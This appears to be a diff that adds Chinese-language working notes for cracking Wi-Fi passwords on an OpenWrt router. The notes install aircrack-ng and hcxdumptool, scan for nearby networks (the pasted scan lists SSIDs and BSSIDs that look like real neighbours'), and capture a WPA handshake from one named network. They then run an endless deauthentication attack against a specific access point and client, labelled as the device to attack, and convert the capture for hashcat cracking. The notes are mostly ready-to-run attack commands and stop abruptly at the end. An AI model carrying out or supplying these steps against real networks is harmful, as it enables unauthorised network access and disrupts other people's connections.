@@ -1,0 +1,81 @@
+===================================================================
+安装openwrt airman-ng
+# opkg update
+# opkg install aircrack-ng airmon-ng hcxdumptool
+===================================================================
+第一步
+设置将路由器网卡设为监听状态
+===================================================================
+第二步
+iwconfig
+airodump-ng wlan0
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+粘贴扫到的Wif
+                                                  
+加入网络：搜索无线
+
+
+100%	CMCC-3308
+Channel: 11 | Mode: Master | BSSID: 44:9D:89:46:3D:39 | Encryption: mixed WPA/WPA2 - PSK	
+
+97%	Tenda_3306
+Channel: 8 | Mode: Master | BSSID: CC:2D:21:21:56:E1 | Encryption: mixed WPA/WPA2 - PSK	
+
+94%	Tenda_DB6350
+Channel: 9 | Mode: Master | BSSID: E8:65:D4:DB:63:51 | Encryption: mixed WPA/WPA2 - PSK	
+
+94%	ChinaNet-rtWX
+Channel: 3 | Mode: Master | BSSID: 0C:37:47:C5:C4:20 | Encryption: mixed WPA/WPA2 - PSK	
+
+91%	ChinaNet-ZXH3EZ
+Channel: 6 | Mode: Master | BSSID: DC:16:B2:5B:91:7C | Encryption: mixed WPA/WPA2 - PSK	
+
+90%	CMCC-sjA9
+Channel: 6 | Mode: Master | BSSID: CC:C2:E0:B9:4F:95 | Encryption: mixed WPA/WPA2 - PSK	
+
+88%	LEDEwoker
+Channel: 11 | Mode: Master | BSSID: 64:09:80:40:DA:45 | Encryption: WPA - PSK	
+
+88%	OldDuck
+Channel: 8 | Mode: Master | BSSID: 04:D4:C4:C8:24:88 | Encryption: WPA2 - PSK	
+
+87%	隐藏
+Channel: 6 | Mode: Master | BSSID: DC:16:B2:5B:91:81 | Encryption: WPA2 - PSK	
+
+87%	CMCC-VWkN
+Channel: 6 | Mode: Master | BSSID: 38:BC:01:07:27:60 | Encryption: mixed WPA/WPA2 - PSK	
+
+87%	葫芦宝贝
+Channel: 11 | Mode: Master | BSSID: F4:83:CD:A0:5E:11 | Encryption: mixed WPA/WPA2 - PSK   
+
+===================================================================
+第三步
+airodump-ng -c 信道 --bssid BSSID -w 要保存的文件名 网卡名
+如果airodump-ng出现[ WPA handshake XX:XX:XX:XX:XX:XX ]提示则握手包已抓到
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+粘贴扫到的Wifi
+airodump-ng -c 8 --bssid CC:2D:21:21:56:E1 -w /tmp/tmp/cap wlan0
+
+===================================================================
+第四步
+aireplay-ng -0 0 -a 热点MAC            -c 设备MAC           wlan0
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+粘贴扫到要攻击的设备
+
+
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+粘贴要攻击的设备
+aireplay-ng -0 0 -a CC:C2:E0:B9:4F:95 -c BA:B0:77:AA:1B:DE wlan0
+
+===================================================================
+第五步：转换握手包
+这个教程跑包用hashcat，需要对WPA握手包转换一下，转换为hashcat -m 22000格式的握手包
+# hcxpcapngtool -o 转换的握手包名 原握手包名.cap
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+hcxpcapngtool -o tmp.txt tmp-05.cap
+
+
+
+hcxdumptool
